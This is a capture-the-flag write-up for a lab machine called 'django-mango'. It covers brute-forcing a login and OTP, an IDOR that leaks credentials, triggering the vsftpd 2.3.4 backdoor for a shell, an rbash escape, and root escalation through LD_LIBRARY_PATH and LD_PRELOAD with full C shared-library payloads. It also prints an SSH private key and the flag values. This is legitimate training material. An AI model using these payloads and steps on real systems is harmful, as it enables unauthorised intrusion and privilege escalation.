# django-mango

This box is designed for web app pentester combine with network pentesting. There are some web vulnerability like access control, idor and ftp backdoor. linux vulnerability like LD_LIBRARY_PATH, LD_PRELOAD, user misconfigration, etc.

# Access 

Available in Tryhackme

# Writeup

# Enumeration

### nmap result

```nmap -A 192.168.22.134```
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-25 13:59 IST
Nmap scan report for 192.168.22.134
Host is up (0.00072s latency).
Not shown: 995 closed tcp ports (reset)
PORT STATE SERVICE VERSION
21/tcp open ftp vsftpd 2.3.4
22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
| 3072 d6:46:48:7f:36:91:ed:8a:bf:dd:6b:51:df:b4:e5:54 (RSA)
| 256 f2:e3:d0:fd:e3:b3:bb:7f:af:b1:54:e0:b4:d2:82:2f (ECDSA)
|\_ 256 0a:08:33:81:4e:5a:b8:ab:5a:7b:dd:3a:1c:ac:34:34 (ED25519)
80/tcp open http Apache httpd 2.4.41 ((Ubuntu))
|\_http-server-header: Apache/2.4.41 (Ubuntu)
|\_http-title: Apache2 Ubuntu Default Page: It works
8000/tcp open http-alt WSGIServer/0.2 CPython/3.8.10
| http-title: Login - Hackstagram
```
## OPEN PORTS:
```
21/tcp open ftp vsftpd 2.3.4
22/tcp open ssh  
80/tcp open http Apache httpd 2.4.41 ((Ubuntu))
8000/tcp open http-alt WSGIServer/0.2 CPython/3.8.10
8090/tcp open
```
// at first try on 21 ftp and ssh. Then I start on PORT 80

## PORT 80:

// default apache2 page

![Alt text](assets/img/Screenshot%202024-06-25%20141835.png) 


// view source (scroll at last)

```
<!---ping.html--->
  </html>

```

// Then I try http://192.168.22.134/ping.html/

![Alt text](assets/img/Screenshot%202024-06-25%20142151.png)

// it's a rabbit hole

![Alt text](assets/img/song.png)

## PORT 8000:

// login page

![Alt text](assets/img/login.png)

// But I don't have username or password. So I start gobuster for directory busting.

```gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.22.134:8000```
```
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url: http://192.168.22.134:8000
[+] Method: GET
[+] Threads: 10
[+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes: 404
[+] User Agent: gobuster/3.6
[+] Timeout: 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/search (Status: 301) [Size: 0] [--> /search/]
/login (Status: 301) [Size: 0] [--> /login/]
/help (Status: 301) [Size: 0] [--> /help/]
/register (Status: 301) [Size: 0] [--> /register/]
/media (Status: 301) [Size: 0] [--> /media/]
/profile (Status: 301) [Size: 0] [--> /profile/]
/admin (Status: 301) [Size: 0] [--> /admin/]
/comment (Status: 301) [Size: 0] [--> /comment/]
/logout (Status: 301) [Size: 0] [--> /logout/]
/forgot_password (Status: 301) [Size: 0] [--> /forgot_password/]
/explore (Status: 301) [Size: 0] [--> /explore/]

========================================
Finished
===============================================================
```
// All are access denied except one that is ```profile```

// ```http://192.168.22.134:8000/profile``` >

{"error": "Username parameter is required. Example /profile/username "}

// so I try to brute force the username via ffuf

```ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -u http://192.168.22.134:8000/profile/FUZZ -mc 200```
```
        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev

---

:: Method : GET
:: URL : http://192.168.22.134:8000/profile/FUZZ
:: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
:: Follow redirects : false
:: Calibration : false
:: Timeout : 10
:: Threads : 40
:: Matcher : Response status: 200

---

admin [Status: 200, Size: 7480, Words: 440, Lines: 183, Duration: 395ms]
```
// ```http://192.168.22.134:8000/profile/admin```

![Alt text](assets/img/Screenshot%202024-06-25%20151330.png)

//I found (access control issue) admin profile . So we got username

// Now I will brutefoce the password via burpsuite

// select the payload position.

![Alt text](assets/img/Screenshot%202024-06-26%20081316.png)

// Go to payload tab and load payload from ```rockyou.txt```.

![Alt text](assets/img/Screenshot%202024-06-26%20081425.png)

// fileter it based on Lenght. i found the password ```alexander```.

![Alt text](assets/img/Screenshot%202024-06-26%20082116.png)

// Password found alexander and username is admin I try to login but its now require otp.

![Alt text](assets/img/Screenshot%202024-06-26%20082714.png)

// So I again try to brute force the otp.

// select payload position. and select Attack Type ```cluster boomb```.

![Alt text](assets/img/Screenshot%202024-06-26%20083555.png)

// Go to paylaod tab and select all payloads number 0-9.

![Alt text](assets/img/Screenshot%202024-06-26%20083604.png)

// Filter it baesd on Lenght.

![Alt text](assets/img/Screenshot%202024-06-26%20083511.png)

// I got the otp ```9010```. I enter the otp and got into admin profile

![Alt text](assets/img/Screenshot%202024-06-26%20083617.png)

// its like a social media platform. So started exploreing and found message things

![Alt text](assets/img/Screenshot%202024-06-26%20083650.png)

//then see a number on the url . Its one and change it to 2 and I found (idor) got some juciy info.

![Alt text](assets/img/Screenshot%202024-06-26%20083715.png)

// After reading the chat i found creds of bug tracketr app

![Alt text](assets/img/Screenshot%202024-06-26%20083748.png)

// hmm Bug Tracking App now i go to port ```8090``` and found bugtracker app

### PORT 8090:

// login into creds from that message

![Alt text](assets/img/Screenshot%202024-06-26%20084305.png)

// home page. Again I started exploring the web app.

![Alt text](assets/img/Screenshot%202024-06-26%20084341.png)

//I got into bug secetion in ```all reports```. There was a login bruteforcing bug. And click on ```view``` button

![Alt text](assets/img/Screenshot%202024-06-26%20084833.png)

![Alt text](assets/img/Screenshot%202024-06-26%20084846.png)

// hmm. Again I see a number and try to change it to 0.

![Alt text](assets/img/Screenshot%202024-06-26%20085112.png)

// I read carefully . Found there is backdoor in vsftpd server to activate the backdoor send ```:-)``` with username and a port will open on ```6201```.

# Foothold

// first i connect to ftp with wrong username added with :-) example: kdghgd:-) after that provide wrong password. 

```ftp 192.168.22.134```

```
Connected to 192.168.22.134.
220 (vsFTPd 2.3.4)
Name (192.168.22.134:root): uayfsc:-)
331 Please specify the password.
Password:

```
// then run this command to connect 

```nc 192.168.22.134 6201```

```
id
uid=1000(baroi) gid=1000(baroi) groups=1000(baroi)

```

# Privilege Escalation

// There is a rbash that i have to bypass.

This command is for stable shell

```script -qc bash /dev/null```

Escaping Rbash

```bash --noprofile```

exporting path variable

```export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games```

// For stablity get shell via ssh

```cat /home/baroi/.ssh/id_rsa```

```
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

// on the Attacker machine create id_rsa file Copy and past it

```nano id_rsa```

chnage permission

```chmod 600 id_rsa```

```ssh baroi@192.168.22.134 -i id_rsa```

Escaping Rbash

```bash --noprofile```

exporting path variable

```export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games```

// Got baroi ssh shell $$$$

```
baroi@django-mango:~$ cat user.txt
89d0aae789b516428d55d4b07f21d33e

```

```cat /etc/passwd```

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
fwupd-refresh:x:111:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
baroi:x:1000:1000:baroi:/home/baroi:/bin/rbash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
redis:x:114:118::/var/lib/redis:/usr/sbin/nologin
ftp:x:1001:1001::/var/ftp:/bin/sh
subho::1002:1002:,,,:/home/subho:/bin/bash
mango:x:1003:1003:,,,:/home/mango:/bin/bash

```
// see it carefully ```subho::1002:1002:,,,:/home/subho:/bin/bash``` it does't contain x . it means that ```subho``` user don't have any password.

```su subho```


// I go subho shell $$$.

```sudo -l```

```
Matching Defaults entries for subho on django-mango:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    env_keep+=LD_LIBRARY_PATH, env_delete+=LD_PRELOAD

User subho may run the following commands on django-mango:
    (mango) SETENV: NOPASSWD: /bin/ls

```

// I can run ```/bin/ls``` as mango user. hmm i can use ```LD_LIBRARY_PATH``` to escalate my privileges.

This command will show what libraray using ```/bin/ls```.

```ldd /bin/ls```

```
linux-vdso.so.1 (0x00007fff96928000)
libselinux.so.1 => /lib/x86_64-linux-gnu/libselinux.so.1 (0x00007f1e6b7bf000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f1e6b5cd000)
libpcre2-8.so.0 => /lib/x86_64-linux-gnu/libpcre2-8.so.0 (0x00007f1e6b53c000)
libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f1e6b536000)
/lib64/ld-linux-x86-64.so.2 (0x00007f1e6b819000)
libpthread.so.0 => /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007f1e6b513000)

```

// So i will Target ```libdl.so.2``` libraray.

// our payload.

```nano exploit.c```

```
static void hijack(void) __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        system("/bin/bash -p");
}

```

// Now i will compile it.

```gcc -shared -o /tmp/libdl.so.2 -fPIC exploit.c -ldl```

// Now giving permission.

```chmod +x /tmp/libdl.so.2```

//now run it with ```/bin/ls```.

```sudo -u mango  LD_LIBRARY_PATH=/tmp /bin/ls```

// I got mango shell $$$$.

```
subho@django-mango:~$ sudo -u mango  LD_LIBRARY_PATH=/tmp /bin/ls
/bin/ls: /tmp/libdl.so.2: no version information available (required by /lib/x86_64-linux-gnu/libselinux.so.1)
mango@django-mango:/home/subho$ id
uid=1003(mango) gid=1003(mango) groups=1003(mango)
```

```sudo -l```

```
Matching Defaults entries for mango on django-mango:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    env_keep+=LD_PRELOAD

User mango may run the following commands on django-mango:
    (ALL) SETENV: NOPASSWD: /bin/pwd

```

// now I have to exploit ```LD_PRELOAD to``` to escalate my privileges.

```nano exploit.c```

```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h> // For setuid and setgid
#include <dlfcn.h>

void my_init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}

// Tell the linker to call `my_init` when the shared library is loaded
__attribute__((constructor)) void init() {
    my_init();
}
```
// Now compile it.

```gcc -shared -o /tmp/libexploit.so -fPIC exploit.c```

// Now giving permission.

```chmod +x /tmp/libexploit.so```

// run our exploit.

```sudo LD_PRELOAD=/tmp/libexploit.so /bin/pwd```

// i got root shell ###

```
root@django-mango:~# id
uid=0(root) gid=0(root) groups=0(root)
root@django-mango:~# cat root.txt
36aae751565a95a822e628d630b5973f

```
